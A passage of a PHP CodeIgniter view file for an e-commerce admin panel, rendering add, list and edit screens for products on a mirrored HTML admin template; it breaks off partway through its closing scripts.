

<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:39:23 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->

    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url();?>assets/images/favicon.png">
    <?php if($action == 'add') {?>
        <title>Add Produk</title>
    <?php }elseif($action == 'edit'){?>
        <title>Edit Produk</title>
    <?php }else{?>
        <title>Manage Produk</title>
    <?php } ?>


    <!-- This page CSS -->
    <!-- chartist CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/morrisjs/morris.css" rel="stylesheet">
    <!--Toaster Popup message CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/toast-master/css/jquery.toast.css" rel="stylesheet">
    <!--c3 plugins CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/c3-master/c3.min.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/style.min.css" rel="stylesheet">
    <!-- Dashboard 1 Page CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/pages/dashboard1.css" rel="stylesheet">
    <!-- Pagu Upload -->
    <link rel="stylesheet" href="<?php echo base_url();?>assets/node_modules/dropify/dist/css/dropify.min.css">
    <!--alerts CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.css" rel="stylesheet" type="text/css">

    <!--text editor-->
     <link rel="stylesheet" href="../assets/node_modules/html5-editor/bootstrap-wysihtml5.css" />
    <!-- page css -->

    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/select2/dist/css/select2.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/switchery/dist/switchery.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />


    <!-- <link href="<?php echo base_url();?>assets/dist/css/pages/floating-label.css" rel="stylesheet"> -->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
 <style type="text/css">
    .select2{
         display: block;
          width: 100% !important;
          padding: 0.375rem 0.75rem;
          font-size: 0.875rem;
          line-height: 1.5;
          color: #4F5467;
          background-color: #fff;
          background-clip: padding-box;
          border: 1px solid #e9ecef;
          border-radius: 0.25rem;
          -webkit-transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          -o-transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          
    }
    .select2-container--default .select2-selection--single{
         border: 0px solid #aaa;
    }

    .editor{
    display: none;
}

</style>
</head>

<body class="fixed-layout lock-nav skin-green-dark">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label"> GOODEVA </p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->

        <?php $this->load->view('admin/common/topbar'); ?>
        
        <!-- ============================================================== -->
        <!-- End Topbar header -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        
        <?php $this->load->view('admin/common/sidebar'); ?>

        <!-- ============================================================== -->
        <!-- End Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page wrapper  -->
        <!-- ============================================================== -->
        <div class="page-wrapper">
            <!-- ============================================================== -->
            <!-- Container fluid  -->
            <!-- ============================================================== -->


<!-- ==================================================================================================================== -->

            <!-- ====================================================== -->
            <!--  Content -->
            <!-- ====================================================== -->
            <div class="container-fluid">
                
               
                <!-- CUSTOM SONTENT HERE !! -->
                    <!-- Create Data -->
                    <?php if($action == 'add') { ?>
                        <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">Produk</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">Produk</li>
                                        <li class="breadcrumb-item active">Add Produk</li>
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== --> 
                        <a href="<?php echo base_url('admin-area/produk') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
                            <div class="row">
                                <div class="col-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="card-title">Add Produk</h4>
                                            <h6 class="card-subtitle">Add Produk </h6>

                                            <!-- Notif Status-->
                                            <?php if ($status_action == 'email'): ?>
                                            <div class="alert alert-warning"> 
                                                <i class="fa fa-warning"></i> Email sudah ada.
                                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                            </div>
                                            <?php endif ?>


                                            <form class="m-t-40" action="<?php echo base_url('admin-area/create-produk'); ?>" method="post" enctype="multipart/form-data" novalidate>

                                            <div class="row">
                                              
                                                 
                                                   <div class="col-md-5" id="form-kiri">
                                                       <div class="form-group">
                                                            <h5>Image Product <span class="text-danger">*</span></h5>
                                                            <div class="controls">
                                                            <input type="file" id="input-file-now-custom-3" name="gambar_produk" class="dropify" data-height="300" class="form-control"  >
                                                            </div>

                                                        </div>

                                                        <style type="text/css">
                                                            .bootstrap-tagsinput{
                                                                width: 100%;
                                                            }
                                                        </style>
                                                        <div class="form-group">
                                                            <h5>Tags</h5>                                                             
                                                        <div class="tags-default">
                                                            <input type="text" name="tags" value="" data-role="tagsinput" placeholder="add tags" />
                                                        </div>
                                                       </div>
                                                   </div>
                                                
                                                    <div class="col-md-7" id="form-kanan">
                                                       <div class="form-group">
                                                           <div class="row">
                                                            <div class="col-lg-2 col-6">
                                                                <h5>Visible</h5> 
                                                                <input type="checkbox" name="visible" value="1"  class="js-switch" data-color="#009efb" />
                                                            </div>
                                                            <div class="col-lg-4 col-6">
                                                               <h5>Featured </h5> 
                                                               <input type="checkbox" value="1" name="featured" class="js-switch" data-color="#009efb" />
                                                            </div>
                                                           </div>
                                                        </div>
                                                        
                                                        <div class="form-group">
                                                            <div class="row">
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
                                                            <h5>Category<span class="text-danger">*</span></h5>
                                                            <select  name="kategori" class="select2 form-control custom-select" style="height: 38px !important; " required>
                                                                <option value="0">-- Select Option</option>

                                                                <?php foreach ($data_kategori as $value): ?>
                                                                     <option value="<?php echo $value->id ?>"><?php echo $value->nama_kategori ?></option>
                                                                <?php endforeach ?>
                                                            </select>
                                                            </div>
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">   

                                                                <h5>Brand<span class="text-danger">*</span></h5>
                                                                <select  name="brand" class="select2 form-control custom-select" style="height: 38px !important; " required>
                                                                    <option value="0">-- Select Option</option>

                                                                    <?php foreach ($data_brand as $value): ?>
                                                                         <option value="<?php echo $value->id ?>"><?php echo $value->nama_brand ?></option>
                                                                    <?php endforeach ?>
                                                                </select>
                                                            </div>
                                                            </div>
                                                                                                            
                                                        </div>
                                                        

                                                        <div class="row">  
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">             
                                                                <div class="form-group">                                 
                                                                <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
                                                                <div class="controls">
                                                                    <input type="text" name="sku"  class="form-control" required data-validation-required-message="This field is required">
                                                                </div>
                                                                </div>
                                                            </div>
                                                            
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6"> 
                                                                <div class="form-group">                                 

                                                                <h5>Local CODE</h5>
                                                                <div class="controls">
                                                                    <input type="text" name="local_code"  class="form-control" required data-validation-required-message="This field is required">
                                                                </div>
                                                                </div>
                                                            </div>
                                                        </div>  

                                                          
                                                      
                                                        
                                                        <div class="row">  
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
                                                            <div class="form-group">                                 

                                                                <h5>List Price</h5>
                                                                <div class="controls">
                                                                    <div class="controls">
                                                                    <input id="tch2" type="number" value="0" name="harga" class=" form-control" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
                                                                    </div>
                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
                                                                </div>
                                                            </div>
                                                            </div>
                                                            
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">                          
                                                                <div class="form-group">                                 

                                                                <h5>Stock</h5>
                                                                <div class="controls">
                                                                    <input id="tch3" type="number" value="0" name="stok" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
                                                                </div>
                                                                </div>
                                                            </div>
                                                             
                                                             
                                                             
                                                        </div> 
                                                        <div class="row">
                                                        <div class="col-md-12 col-sm-12 col-12 col-lg-12">             
                                                            <div class="form-group">                                 
                                                            <h5>Short Description<span class="text-danger">*</span></h5>
                                                            <div class="controls">
                                                                <input type="text" name="short"  class="form-control" required data-validation-required-message="This field is required">
                                                            </div>
                                                            </div>
                                                        </div>
                                                        


                                                        </div>
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                   </div>  
                                                     
                                                <div class="col-6">
                                                    <h5>Spesification</h5>
                                                    <div class="form-group">
                                                        <textarea id="editor1" name="spesification" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
                                                    </div>
                                               
                                                </div>
                                                <div class="col-6">
                                                    <h5>Description</h5>
                                                    <div class="form-group">
                                                        <textarea id="editor2" name="description" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."></textarea>
                                                    </div>
                                               
                                                </div>                       
                                            </div>                                                                   
                                                <div class="text-xs-right">
                                                    <button type="submit" class="btn btn-info">Submit</button>
                                                    <button type="reset" class="btn btn-inverse">Cancel</button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
                                 
                            </div>


                    <?php } ?>
                    <!-- End Create Data -!>



                    <!-- Read data -->
                    <?php if($action == '') {?> 
                        <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">Manage Produk</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">Produk</li>
                                        <li class="breadcrumb-item active">Manage Produk</li>
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->    


                        <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Produk</button></a>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="card">
                                    <div class="card-body">
                                        <h4 class="card-title">Manage Produk</h4>
                                        <h6 class="card-subtitle">Produk Data</h6>
                                        <hr>

                                        <!-- Notif Status-->
                                        <?php if ($status_action == 'save'): ?>
                                        <div class="alert alert-success"> 
                                            <i class="fa fa-check-circle"></i> Data berhasil di Tambahkan.
                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                        </div>
                                        <?php endif ?>

                                        <?php if ($status_action == 'update'): ?>
                                        <div class="alert alert-warning"> 
                                            <i class="fa fa-check-circle"></i> Data berhasil di Update.
                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                        </div>
                                        <?php endif ?>
                                        <!-- End Notif Status -->

                                        

                                        
                                        


                                        <div class="table-responsive ">

                                            <table id="myTable" class="nowrap table table-bordered table-striped ">
                                                <thead>
                                                    <tr >
                                                        <th>No</th>
                                                        <th>SKU</th>
                                                        <th>Image</th>
                                                        <th>Short Desc</th>
                                                        <th>Kategori</th>
                                                        <th>Brand</th>
                                                        <th>Harga</th>
                                                        <th>Jumlah/Stok</th>
                                                        <th>visible</th>
                                                        <th>featured</th>       
                                                        <th>tags</th>
                                                        
                                                        <th scope="col">Aksi</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                <?php $no=1; foreach ($data_produk as $produk_data): ?>
                                                    <tr data-id="<?php echo $produk_data->id ;?>" role="row">
                                                        <td><?php echo $no++ ; ?></td>
                                                        <td id="sku"><?php echo $produk_data->sku; ?></td>
                                                        <td><img src="<?php echo base_url();?>my-assets/image/product/<?php echo $produk_data->gambar_produk ; ?>" alt="<?php echo $produk_data->gambar_produk ; ?>" width="40" class="img-circle"></td>
                                                        <td>
                                                                <div style="width:250px;padding: 5px; overflow:scroll;overflow-y: hidden;">
                                                                     <?php echo $produk_data->short_deskripsi ?>

                                                                </div>
                                                        </td>
                                                        <td><?php 

                                                        $kategori = $this->Category_model->get_where($produk_data->id_kategori ) ;
                                                        foreach ($kategori as $kategori) {
                                                            echo $kategori->nama_kategori;
                                                        }
                                                        ?></td>
                                                        <td><?php 
                                                        $brand = $this->Brand_model->get_where($produk_data->id_brand ) ;
                                                        foreach ($brand as $brand) {
                                                            echo $brand->nama_brand;
                                                        }


                                                        ?></td>
                                                        <td><?php echo 'Rp. '. number_format($produk_data->harga) ; ?></td>
                                                        <td><?php echo $produk_data->stok ; ?></td>
                                                        <td><?php if($produk_data->visible == 1) echo '<span class="label label-success">ON</span>'; else echo '<span class="label label-danger">OFF</span>' ; ?></td>
                                                        <td><?php if($produk_data->featured == 1) echo '<span class="label label-success">ON</span>'; else echo '<span class="label label-danger">OFF</span>'; ?></td>
                                                        <td>
                                                        <?php echo $produk_data->tags ; ?>        
                                                        </td>
                                                        
                                                        <td>

                                                            <a href="?action=edit&id=<?php echo $produk_data->id ;?>"><button type="button" class="btn btn-sm btn-icon btn-pure btn-outline edit-row-btn" data-toggle="tooltip" data-original-title="Edit"><i class="fa fa-edit" aria-hidden="true"></i></button></a>

                                                            <button type="button" data-id="<?php echo $produk_data->id ;?>" data-name="<?php echo $produk_data->sku ;?>" data-photo="<?php echo $produk_data->gambar_produk ;?>" class="btn btn-sm btn-icon btn-danger btn-outline delete-row-btn hapus-produk" data-toggle="tooltip" data-original-title="Delete" ><i class="ti-trash" aria-hidden="true"></i></button>

                                                            

                                                        </td>
                                                    </tr>
                                                <?php endforeach ?>
                                                
                                               
                                                    
                                                  
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php } ?>
                    <!-- End Read Data -->

                    <!-- Create Data -->
                    <?php if($action == 'edit') { ?>
                       <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">Customer</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">Customer</li>
                                        <li class="breadcrumb-item active">Add Customer</li>
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== --> 
                        <a href="<?php echo base_url('admin-area/produk') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Produk</button></a>   
                            <div class="row">
                                <div class="col-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="card-title">Add Produk</h4>
                                            <h6 class="card-subtitle">Add Produk </h6>

                                            <!-- Notif Status-->
                                            <?php if ($status_action == 'email'): ?>
                                            <div class="alert alert-warning"> 
                                                <i class="fa fa-warning"></i> Email sudah ada.
                                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                            </div>
                                            <?php endif ?>


                                            <form class="m-t-40" action="<?php echo base_url('admin-area/update-produk'); ?>" method="post" enctype="multipart/form-data" novalidate>
                                                    
                                            <?php foreach ($data_produk_edit as $data_edit ): ?>


                                            <div class="row">
                                              
                                                 
                                                   <div class="col-md-5" id="form-kiri">
                                                       <div class="form-group">
                                                            <h5>Image Product <span class="text-danger">*</span></h5>
                                                            <div class="controls">
                                                            <input type="file" id="input-file-now-custom-3" data-default-file="<?php echo base_url(); ?>my-assets/image/product/<?php echo $data_edit->gambar_produk; ?>" name="gambar_produk" class="dropify" data-height="300" class="form-control"  >
                                                            <input type="hidden" name="gambar_lama" value="<?php echo $data_edit->gambar_produk; ?>">
                                                            <input type="hidden" name="id" value="<?php echo $data_edit->id ?>">
                                                            </div>

                                                        </div>

                                                        <style type="text/css">
                                                            .bootstrap-tagsinput{
                                                                width: 100%;
                                                            }
                                                        </style>
                                                        <div class="form-group">
                                                            <h5>Tags</h5>                                                             
                                                        <div class="tags-default">
                                                            <input type="text" name="tags" value="<?php echo $data_edit->tags; ?>" data-role="tagsinput" placeholder="add tags" />
                                                        </div>
                                                       </div>
                                                   </div>
                                                
                                                    <div class="col-md-7" id="form-kanan">
                                                       <div class="form-group">
                                                           <div class="row">
                                                            <div class="col-lg-2 col-6">
                                                                <h5>Visible</h5> 
                                                                <input type="checkbox" name="visible" value="1" <?php if($data_edit->visible == 1 ) echo 'checked' ;?> class="js-switch" data-color="#009efb" />
                                                            </div>
                                                            <div class="col-lg-4 col-6">
                                                               <h5>Featured </h5> 
                                                               <input type="checkbox" value="1" <?php if($data_edit->featured == 1 ) echo 'checked' ;?> name="featured" class="js-switch" data-color="#009efb" />
                                                            </div>
                                                           </div>
                                                        </div>
                                                        
                                                        <div class="form-group">
                                                            <div class="row">
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
                                                            <h5>Category<span class="text-danger">*</span></h5>
                                                            <select  name="kategori" class="select2 form-control custom-select" style="height: 38px !important; " required>
                                                                <option value="0">-- Select Option</option>

                                                                <?php foreach ($data_kategori as $value): ?>
                                                                     <option <?php if($data_edit->id_kategori == $value->id ) echo 'selected' ;?> value="<?php echo $value->id ?>"><?php echo $value->nama_kategori ?></option>
                                                                <?php endforeach ?>
                                                            </select>
                                                            </div>
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">   

                                                                <h5>Brand<span class="text-danger">*</span></h5>
                                                                <select  name="brand" class="select2 form-control custom-select" style="height: 38px !important; " required>
                                                                    <option value="0">-- Select Option</option>

                                                                    <?php foreach ($data_brand as $value_brand): ?>
                                                                         <option <?php if($data_edit->id_brand == $value_brand->id ) echo 'selected' ;?>  value="<?php echo $value_brand->id ?>"><?php echo $value_brand->nama_brand ?></option>
                                                                    <?php endforeach ?>
                                                                </select>
                                                            </div>
                                                            </div>
                                                                                                            
                                                        </div>
                                                        

                                                        <div class="row">  
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">             
                                                                <div class="form-group">                                 
                                                                <h5>Manufacturer SKU<span class="text-danger">*</span></h5>
                                                                <div class="controls">
                                                                    <input type="text" name="sku" value="<?php echo $data_edit->sku; ?>" class="form-control" required data-validation-required-message="This field is required">
                                                                </div>
                                                                </div>
                                                            </div>
                                                            
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6"> 
                                                                <div class="form-group">                                 

                                                                <h5>Local CODE</h5>
                                                                <div class="controls">
                                                                    <input type="text" name="local_code" value="<?php echo $data_edit->local_code; ?>"  class="form-control" required data-validation-required-message="This field is required">
                                                                </div>
                                                                </div>
                                                            </div>
                                                        </div>  

                                                          
                                                      
                                                        
                                                        <div class="row">  
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">
                                                            <div class="form-group">                                 

                                                                <h5>List Price</h5>
                                                                <div class="controls">
                                                                    <div class="controls">
                                                                    <input id="tch2" type="number" value="<?php echo $data_edit->harga; ?>" name="harga" class=" form-control" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
                                                                    </div>
                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
                                                                </div>
                                                            </div>
                                                            </div>
                                                            
                                                            <div class="col-md-12 col-sm-12 col-12 col-lg-6">                          
                                                                <div class="form-group">                                 

                                                                <h5>Stock</h5>
                                                                <div class="controls">
                                                                    <input id="tch3" type="number" value="<?php echo $data_edit->stok; ?>" name="stok" data-bts-button-down-class="btn btn-secondary btn-outline" data-bts-button-up-class="btn btn-secondary btn-outline"> 
                                                                    <!-- <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> -->
                                                                </div>
                                                                </div>
                                                            </div>
                                                             
                                                             
                                                             
                                                        </div> 
                                                        <div class="row">
                                                        <div class="col-md-12 col-sm-12 col-12 col-lg-12">             
                                                            <div class="form-group">                                 
                                                            <h5>Short Description<span class="text-danger">*</span></h5>
                                                            <div class="controls">
                                                                <input type="text" name="short" value="<?php echo $data_edit->short_deskripsi; ?>" class="form-control" required data-validation-required-message="This field is required">
                                                            </div>
                                                            </div>
                                                        </div>
                                                        


                                                        </div>
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                   </div>  
                                                     
                                                <div class="col-6">
                                                    <h5>Spesification</h5>
                                                    <div class="form-group">
                                                        <textarea id="editor1" name="spesification" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."><?php echo $data_edit->spesification; ?></textarea>
                                                    </div>
                                               
                                                </div>
                                                <div class="col-6">
                                                    <h5>Description</h5>
                                                    <div class="form-group">
                                                        <textarea id="editor2" name="description" class="textarea_editor form-control" rows="15" placeholder="Enter text ..."><?php echo $data_edit->description; ?></textarea>
                                                    </div>
                                               
                                                </div>                       
                                            </div> 

                                            <?php endforeach ?>


                                                <div class="text-xs-right">
                                                    <button type="submit" class="btn btn-info">Submit</button>
                                                    <button type="reset" class="btn btn-inverse">Cancel</button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
                                 
                            </div>



                    <?php } ?>
                    <!-- End Create Data -!>


             

             

         
          


                    


                <!-- END CUSTOM SONTENT HERE !! -->






                <!-- ============================================================== -->
                <!-- Right sidebar -->
                <!-- ============================================================== -->
                <!-- .right-sidebar -->
                <div class="right-sidebar">
                    <div class="slimscrollright">
                        <div class="rpanel-title"> Service Panel <span><i class="ti-close right-side-toggle"></i></span> </div>
                        <div class="r-panel-body">
                            <ul id="themecolors" class="m-t-20">
                                <li><b>With Light sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default" class="default-theme">1</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green" class="green-theme">2</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red" class="red-theme">3</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue" class="blue-theme">4</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple" class="purple-theme">5</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna" class="megna-theme">6</a></li>
                                <li class="d-block m-t-30"><b>With Dark sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default-dark" class="default-dark-theme">7</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green-dark" class="green-dark-theme">8</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red-dark" class="red-dark-theme working">9</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue-dark" class="blue-dark-theme">10</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple-dark" class="purple-dark-theme">11</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna-dark" class="megna-dark-theme ">12</a></li>
                            </ul>
                            <ul class="m-t-20 chatonline">
                                <li><b>Chat option</b></li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/1.jpg" alt="user-img" class="img-circle"> <span>Varun Dhavan <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/2.jpg" alt="user-img" class="img-circle"> <span>Genelia Deshmukh <small class="text-warning">Away</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/3.jpg" alt="user-img" class="img-circle"> <span>Ritesh Deshmukh <small class="text-danger">Busy</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/4.jpg" alt="user-img" class="img-circle"> <span>Arijit Sinh <small class="text-muted">Offline</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/5.jpg" alt="user-img" class="img-circle"> <span>Govinda Star <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/6.jpg" alt="user-img" class="img-circle"> <span>John Abraham<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/7.jpg" alt="user-img" class="img-circle"> <span>Hritik Roshan<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/8.jpg" alt="user-img" class="img-circle"> <span>Pwandeep rajan <small class="text-success">online</small></span></a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- End Right sidebar -->
                <!-- ============================================================== -->
            </div>
                    <!-- ====================================================== -->
                    <!-- End Content -->
                    <!-- ====================================================== -->

<!-- ==================================================================================================================== -->



            <!-- ============================================================== -->
            <!-- End Container fluid  -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- footer -->
        <!-- ============================================================== -->
        <?php $this->load->view('admin/common/footer'); ?>
        <!-- ============================================================== -->
        <!-- End footer -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url();?>assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap popper Core JavaScript -->
    <script src="<?php echo base_url();?>assets/node_modules/popper/popper.min.js"></script>
    <script src="<?php echo base_url();?>assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/perfect-scrollbar.jquery.min.js"></script>
    <!--Wave Effects -->
    <script src="<?php echo base_url();?>assets/dist/js/waves.js"></script>
    <!--Menu sidebar -->
    <script src="<?php echo base_url();?>assets/dist/js/sidebarmenu.js"></script>
    <!--Custom JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/custom.min.js"></script>
    <script src="<?php echo base_url();?>assets/dist/js/pages/validation.js"></script>
    <!-- CKEDITOR -->
    <script src="<?php echo base_url() ?>assets/ckeditor/ckeditor.js"></script>

    <!-- ============================================================== -->
    <!-- This page plugins -->
    <!-- CK EDITOR SCRIPT-->
    <script>
        // Replace the <textarea id="editor1"> with a CKEditor
        // instance, using default configuration.
        CKEDITOR.replace( 'editor1' ,{
        filebrowserImageBrowseUrl : 'kcfinder'
    });
        CKEDITOR.replace( 'editor2',{
        filebrowserImageBrowseUrl : 'kcfinder'
    } );
    </script>
    <!-- This is data table -->
    <script src="<?php echo base_url();?>assets/node_modules/datatables/jquery.dataTables.min.js"></script>
    

    <script>
    $(document).ready(function() {
        $('#tabelKu').DataTable();
